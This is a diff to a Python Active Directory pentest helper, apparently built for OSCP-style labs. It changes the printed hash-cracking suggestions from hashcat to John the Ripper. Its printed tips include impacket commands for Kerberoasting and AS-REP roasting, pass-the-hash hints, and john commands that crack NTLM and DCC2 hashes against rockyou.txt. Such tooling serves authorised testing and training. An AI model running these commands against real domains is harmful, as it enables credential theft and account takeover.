@@ -159,6 +159,7 @@ PORT_PROBE_TIMEOUT       = 2.0
 MAX_CONSECUTIVE_TIMEOUTS = 3
 DEFAULT_MAX_CIDR_HOSTS   = 1024
 DEFAULT_SPRAY_DELAY      = 0     # no delay by default (OSCP boxes have no lockout)
+WORDLIST                 = "/usr/share/wordlists/rockyou.txt"
 
 
 # ─── Data classes ──────────────────────────────────────────────────────
@@ -1975,11 +1976,11 @@ class NxcPlus:
         if has("kerberoastable (SPN) accounts"):
             tips.append(("roast the SPN accounts (crack offline, no lockout risk)",
                          f"impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain}/USER:PASS "
-                         f"-outputfile kerb.hash  &&  hashcat -m 13100 kerb.hash rockyou.txt"))
+                         f"-outputfile kerb.hash  &&  john --format=krb5tgs kerb.hash --wordlist={WORDLIST}"))
         if has("AS-REP roastable (no preauth)"):
             tips.append(("AS-REP roast (no creds needed)",
                          f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -request -no-pass "
-                         f"-usersfile users.txt  &&  hashcat -m 18200 asrep.hash rockyou.txt"))
+                         f"-usersfile users.txt  &&  john --format=krb5asrep asrep.hash --wordlist={WORDLIST}"))
         maq = found.get("MachineAccountQuota") or []
         maq_val = next((x.split(":")[-1].strip() for x in maq if "Quota" in x), None)
         if maq_val and maq_val.isdigit() and int(maq_val) > 0:
@@ -2137,11 +2138,13 @@ class NxcPlus:
         if ntlm:
             path = dump("ntlm_hashes.txt", ntlm)
             print_info("[*]", f"NTLM ({len(ntlm)}) -> pass-the-hash directly, or crack:", indent=1)
-            print_info("[*]", f"hashcat -m 1000 {path} /usr/share/wordlists/rockyou.txt", indent=2)
+            print_info("[*]", f"john --format=NT {path} --wordlist={WORDLIST}"
+                              f"   {DIM}(hashcat -m 1000){RESET}", indent=2)
         if dcc2:
             path = dump("dcc2.hash", dcc2)
             print_info("[*]", f"DCC2 cached ({len(dcc2)}) -> MUST crack:", indent=1)
-            print_info("[*]", f"hashcat -m 2100 {path} /usr/share/wordlists/rockyou.txt", indent=2)
+            print_info("[*]", f"john --format=mscash2 {path} --wordlist={WORDLIST}"
+                              f"   {DIM}(hashcat -m 2100){RESET}", indent=2)
         if pivots:
             print()
             print_info("[!]", "PIVOT SUBNETS — hidden networks via dual-homed hosts", indent=0)
@@ -2185,10 +2188,10 @@ class NxcPlus:
                     f"impacket-GetNPUsers {dom}/ -dc-ip {dc_ip} "
                     f"-request -no-pass -usersfile users.txt", indent=2)
             print()
-            print_info("[*]", "cracking hashes", indent=1)
-            print_info("[*]", "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt  # AS-REP", indent=2)
-            print_info("[*]", "hashcat -m 13100 kerb.hash  /usr/share/wordlists/rockyou.txt  # Kerberoast", indent=2)
-            print_info("[*]", "hashcat -m 1000  ntds.hash  /usr/share/wordlists/rockyou.txt  # NTLM", indent=2)
+            print_info("[*]", "cracking hashes  (john = CPU, works without a GPU)", indent=1)
+            print_info("[*]", f"john --format=krb5asrep asrep.hash --wordlist={WORDLIST}  # AS-REP  (hashcat -m 18200)", indent=2)
+            print_info("[*]", f"john --format=krb5tgs   kerb.hash  --wordlist={WORDLIST}  # Kerberoast  (hashcat -m 13100)", indent=2)
+            print_info("[*]", f"john --format=NT        ntds.hash  --wordlist={WORDLIST}  # NTLM  (hashcat -m 1000)", indent=2)
 
         if has_files:
             print()
